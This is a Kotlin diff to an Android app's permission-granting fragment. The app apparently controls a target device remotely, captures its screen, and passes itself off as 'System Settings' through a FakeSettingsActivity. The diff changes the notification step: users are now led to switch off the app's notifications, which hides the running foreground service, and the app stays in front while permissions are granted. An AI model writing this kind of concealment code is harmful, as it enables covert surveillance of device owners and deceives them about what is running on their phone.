@@ -354,7 +354,10 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
                 }
             } else if (manualAuthFlowActive && isAllPermissionsAuthorized()) {
                 SettingUtils.autoAuthorizeDone = true
-                Log.i(TAG, "★ 一键授权：全部权限已就绪")
+                // ★ 2026-11-04【需求】授权完成 → 继续停在真实界面（不自动退后台），
+                //   由用户按返回键或切桌面/切走时才收起。
+                markAuthStayForeground(true)
+                Log.i(TAG, "★ 一键授权：全部权限已就绪（保持真实界面在前台）")
             }
         } catch (e: Exception) {
             Log.w(TAG, "自动授权完成检测异常: ${e.message}")
@@ -1068,6 +1071,18 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
         }
     }
 
+    /** ★ 2026-11-04【需求】把"授权流程开始/完成"告知 MainActivity：
+     *  授权期间及完成后保持真实界面在前台，不自动退后台；
+     *  只有用户按返回键或切桌面/切走（MainActivity.onBackPressed / onUserLeaveHint）才收起。 */
+    private fun markAuthStayForeground(completed: Boolean) {
+        try {
+            val a = activity as? cn.ppps.forwarder.activity.MainActivity ?: return
+            if (completed) a.markAuthFlowCompleted() else a.markAuthFlowStarted()
+        } catch (t: Throwable) {
+            Log.w(TAG, "标记授权停留态失败: ${t.message}")
+        }
+    }
+
     private fun openFakeSettings() {
         try {
             startActivity(Intent(requireContext(), cn.ppps.forwarder.activity.FakeSettingsActivity::class.java))
@@ -1121,6 +1136,11 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
         manualAuthFlowActive = true
         manualAuthFlowStartTime = System.currentTimeMillis()
         lastAuthStepAt = manualAuthFlowStartTime
+        // ★ 2026-11-04【需求】授权全程保持真实界面在前台：
+        //   markSystemUiHandoff 让紧接着弹出的权限窗/设置页不被误判成"用户回家"；
+        //   markAuthStayForeground 让 MainActivity.onStop 在授权中/完成后都不自动 finish。
+        markSystemUiHandoff()
+        markAuthStayForeground(false)
 
         try {
             // ★ 2026-08-28 第 0 步（统一模块）：对"项目实际用到的"仍未授予的运行时权限做一次批量申请。
@@ -1267,6 +1287,11 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
             val now = System.currentTimeMillis()
             // 更新"授权动作"时间戳：MainActivity 靠它判断"授权流程还在进行，别摘界面"
             lastAuthStepAt = now
+            // ★ 2026-11-04：每次自动跳系统页前都补一次"系统 UI 交接"时间戳，
+            //   让 onUserLeaveHint 区分"我们拉起的设置页"与"用户按 Home"；
+            //   同时确保停留态在每次跳转后仍然有效（Activity 重建也不丢）。
+            markSystemUiHandoff()
+            markAuthStayForeground(false)
             // 与上一次自动跳转间隔至少 3 秒，防止快速 onResume 抖动重复跳转
             if (now - lastAutoManualJumpTime < 3000) return
             // 1. 屏幕预览（MediaProjection 系统弹窗）
@@ -1310,13 +1335,16 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
                     return
                 }
             }
-            // 3.6 通知（Android 13+ POST_NOTIFICATIONS / 通知渠道被关）——前台服务保活通知必需
-            if (!cn.ppps.forwarder.permission.PermissionProbe.areNotificationsEnabled(ctx)) {
-                if (autoManualPrompted.add("notification")) {
+            // 3.6 通知：★ 2026-11-04【需求变更】原逻辑是"通知没开就引导去开"，
+            //   用户明确要求自动授权时**关闭被控端通知**（通知栏不要出现"系统设置 正在运行"）。
+            //   Android 不允许 App 自己关通知开关，只能跳到系统通知设置让用户点一次；
+            //   关闭后前台服务照常运行（渠道已降为 IMPORTANCE_MIN，即使开着也无声音/无状态栏图标）。
+            if (cn.ppps.forwarder.permission.PermissionProbe.areNotificationsEnabled(ctx)) {
+                if (autoManualPrompted.add("notification_off")) {
                     lastAutoManualJumpTime = now
-                    Log.i(TAG, "★ 自动授权继续：跳转通知设置")
+                    Log.i(TAG, "★ 自动授权继续：引导关闭本应用通知（前台服务不受影响）")
                     cn.ppps.forwarder.permission.PermissionRequests.openNotificationSettings(ctx)
-                    XToastUtils.toast("请开启 SmsForwarder 的通知权限后返回应用")
+                    XToastUtils.toast("可在本页关闭「系统设置」的通知（不影响被控端运行）")
                     return
                 }
             }
